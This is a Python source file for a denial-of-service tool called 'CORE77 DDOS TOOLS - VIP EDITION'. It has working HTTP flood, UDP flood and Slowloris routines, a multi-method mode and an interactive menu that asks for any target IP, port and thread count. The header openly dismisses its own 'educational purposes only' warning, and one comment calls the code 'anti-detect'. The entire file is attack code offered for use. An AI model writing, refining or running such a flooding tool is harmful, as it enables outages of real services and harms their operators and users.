#!/usr/bin/env python3
"""
CORE77 DDOS TOOLS - VIP EDITION
WARNING: FOR EDUCATIONAL PURPOSES ONLY (BULLSHIT)
"""

import socket
import threading
import random
import time
import sys
import os

# BANNER CORE77
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
╔══════════════════════════════════════════╗
║   ██████╗ ██████╗ ██████╗ ███████╗██╗  ██╗
║   ██╔═══██╗██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝
║   ██║   ██║██████╔╝██████╔╝█████╗   ╚███╔╝ 
║   ██║   ██║██╔══██╗██╔══██╗██╔══╝   ██╔██╗ 
║   ╚██████╔╝██║  ██║██║  ██║███████╗██╔╝ ██╗
║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
║      DDOS VIP EDITION - BY ORGAN GANTENG   
╚══════════════════════════════════════════╝
    """)

# DDOS METHODS
class CORE77DDOS:
    def __init__(self, target_ip, target_port, threads=500):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.attack_running = True
        
        # FAKE USER AGENTS
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36",
            "CORE77-BOT/v1.0"
        ]
    
    def http_flood(self):
        """HTTP FLOOD ATTACK"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))
                
                # BUILD MALICIOUS HTTP REQUEST
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.target_ip}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Connection: keep-alive\r\n"
                request += "Accept: */*\r\n\r\n"
                
                sock.send(request.encode())
                sock.close()
                
                print(f"[+] HTTP Flood sent to {self.target_ip}:{self.target_port}")
                
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(0.1)
    
    def udp_flood(self):
        """UDP FLOOD (HIGH BANDWIDTH)"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # RANDOM PAYLOAD SIZE (1024-65500 bytes)
                payload_size = random.randint(1024, 65500)
                payload = random._urandom(payload_size)
                
                sock.sendto(payload, (self.target_ip, self.target_port))
                sock.close()
                
                print(f"[+] UDP Packet ({payload_size} bytes) sent")
                
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def slowloris(self):
        """SLOWLORIS ATTACK (KEEP CONNECTIONS OPEN)"""
        sockets = []
        try:
            for _ in range(200):  # CREATE MANY SOCKETS
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.target_ip, self.target_port))
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                sockets.append(s)
                print(f"[+] Slowloris connection {len(sockets)} established")
            
            # KEEP SENDING PARTIAL HEADERS
            while self.attack_running and sockets:
                for s in sockets:
                    try:
                        s.send("X-a: b\r\n".encode())
                        time.sleep(random.randint(10, 30))
                    except:
                        sockets.remove(s)
                        
        except Exception as e:
            print(f"[!] Slowloris error: {e}")
    
    def start_attack(self, method="http"):
        """START DDOS WITH SELECTED METHOD"""
        print(f"[+] Starting {method.upper()} attack on {self.target_ip}:{self.target_port}")
        print(f"[+] Threads: {self.threads}")
        print("[+] Press Ctrl+C to stop\n")
        
        threads = []
        
        for _ in range(self.threads):
            if method == "http":
                t = threading.Thread(target=self.http_flood)
            elif method == "udp":
                t = threading.Thread(target=self.udp_flood)
            elif method == "slowloris":
                t = threading.Thread(target=self.slowloris)
            else:
                print("[!] Invalid method")
                return
            
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            self.attack_running = False
            for t in threads:
                t.join()
            print("[+] Attack stopped")

# MAIN MENU
def main():
    banner()
    
    print("SELECT ATTACK TYPE:")
    print("1. HTTP Flood (Layer 7)")
    print("2. UDP Flood (Bandwidth)")
    print("3. Slowloris (Resource exhaustion)")
    print("4. Multi-Method (ALL IN ONE)")
    print("5. Exit\n")
    
    choice = input("Choice (1-5): ")
    
    if choice == "5":
        print("[+] Exiting...")
        sys.exit()
    
    target_ip = input("Target IP/Domain: ")
    target_port = int(input("Target Port (80 for HTTP): "))
    threads = int(input("Threads (recommend 100-1000): "))
    
    ddos = CORE77DDOS(target_ip, target_port, threads)
    
    if choice == "1":
        ddos.start_attack("http")
    elif choice == "2":
        ddos.start_attack("udp")
    elif choice == "3":
        ddos.start_attack("slowloris")
    elif choice == "4":
        print("[+] Starting MULTI-ATTACK...")
        # COMBINE ALL METHODS
        threading.Thread(target=ddos.http_flood).start()
        threading.Thread(target=ddos.udp_flood).start()
        threading.Thread(target=ddos.slowloris).start()
        input("\n[+] Press Enter to stop...")
        ddos.attack_running = False
    else:
        print("[!] Invalid choice")

# ANTI-DETECT
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Critical error: {e}")
        time.sleep(60)  # DELAY BEFORE EXIT